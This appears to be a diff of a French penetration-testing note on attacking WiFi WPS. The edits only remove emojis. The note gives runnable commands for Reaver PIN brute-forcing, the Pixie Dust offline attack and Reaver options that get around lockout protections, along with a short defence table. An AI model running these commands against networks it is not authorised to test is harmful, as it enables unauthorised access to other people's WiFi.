@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 🔢 Attaques WiFi — WPS
+# Attaques WiFi — WPS
 
 > [!info] **En 1 phrase**
 > Le **WPS** (Wi-Fi Protected Setup) laisse entrer un **PIN de 8 chiffres** (validation en 2 moitiés → seulement 11 000
@@ -21,7 +21,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -33,13 +33,13 @@ flowchart LR
     E --> F[Clé WPA2 en clair<br>récupérée par le AP]
 ```
 
-> [!info] 💡 **Pourquoi le WPS est une backdoor**
+> [!info] **Pourquoi le WPS est une backdoor**
 > Le PIN (8 chiffres) est vérifié en **2 étapes de 4+3** chiffres → **~11 000** combinaisons seulement.
 > En plus, les **nonces EAP (PKE/PKR)** sont souvent faibles → **Pixie Dust** les retrouve offline.
 
 ---
 
-## 🔍 Détecter le WPS
+## Détecter le WPS
 
 ```bash
 airmon-ng start wlan0
@@ -54,11 +54,11 @@ apt-get install reaver
 wash -i mon0
 ```
 
-> [!warning] ⚠️ Un WPS **locked** a beaucoup moins de chances de succès.
+> [!warning] Un WPS **locked** a beaucoup moins de chances de succès.
 
 ---
 
-## ⌨️ Attaque online avec Reaver
+## Attaque online avec Reaver
 
 ```bash
 # Attaque brute-force du PIN (peut être LONG)
@@ -69,7 +69,7 @@ reaver -i mon0 -c 6 -b 00:23:69:48:33:95 -vv
 
 ---
 
-## ⚡ Pixie Dust (offline, secondes)
+## Pixie Dust (offline, secondes)
 
 ```bash
 # 1. Capturer les nonces EAP (PKE, PKR, e-hash1, e-hash2, authkey, e-nonce)
@@ -80,12 +80,12 @@ pixiewps -e <pke> -r <pkr> -s <e-hash1> -z <e-hash2> -a <authkey> -n <e-nonce>
 reaver -i <monitor interface> -b <bssid> -c <channel> -p <PIN>
 ```
 
-> [!tip] 💡 **Pixie Dust** exploite la génération **faible des nonces** (D-Link, TP-Link, etc.) :
+> [!tip] **Pixie Dust** exploite la génération **faible des nonces** (D-Link, TP-Link, etc.) :
 > les secrets EAP sont dérivés du temps/du compteur → **crack hors-ligne** instantané.
 
 ---
 
-## 🛡️ Bypass des protections (rate-limit, locked)
+## Bypass des protections (rate-limit, locked)
 
 > Certains fabricants protègent le WPS. Options Reaver pour contourner :
 
@@ -100,7 +100,7 @@ reaver -i mon0 -c 6 -b 00:23:69:48:33:95 -vv -L -N -d 15 -T .5 -r 3:15
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Réponse | Détail |
 |---|---|
@@ -109,14 +109,14 @@ reaver -i mon0 -c 6 -b 00:23:69:48:33:95 -vv -L -N -d 15 -T .5 -r 3:15
 | **WPS avec push-button uniquement** | Empêche l'attaque PIN en ligne |
 | **Surveillance** | Les séquences M1-M8 répétées sont détectables (WIDS) |
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
 - « **Detected AP rate limiting, waiting 315 seconds** » = le AP est protégé → très long (voir switches `-d -r`).
 - « **Receive timeout occurred** » = le AP est **trop loin** (puissance).
 - Le WPS donne la **clé en clair** → pas besoin de cracker le handshake ensuite.
 - Certaines box récentes **désactivent le WPS après échecs** → patience et bon timing.
 
-> [!info] 📚 **Sources**
+> [!info] **Sources**
 > GitHub : [swisskyrepo/HardwareAllTheThings – `docs/protocols/wifi/wifi-wpa.md`](https://github.com/swisskyrepo/HardwareAllTheThings/blob/main/docs/protocols/wifi/wifi-wpa.md) (section WPS)
 
-➡️ **Liens :** [[Attaques WiFi (WPA2 et PMKID)|📶 Hub WiFi]] · [[Attaques WiFi - WPA2 PSK|🔐 WPA2-PSK]] · [[Attaques WiFi - Préparation & Basiques|🧰 Préparation]] · [[Bibliothèque technique|🏠 Index]]
+**Liens :** [[Attaques WiFi (WPA2 et PMKID)| Hub WiFi]] · [[Attaques WiFi - WPA2 PSK| WPA2-PSK]] · [[Attaques WiFi - Préparation & Basiques| Préparation]] · [[Bibliothèque technique| Index]]
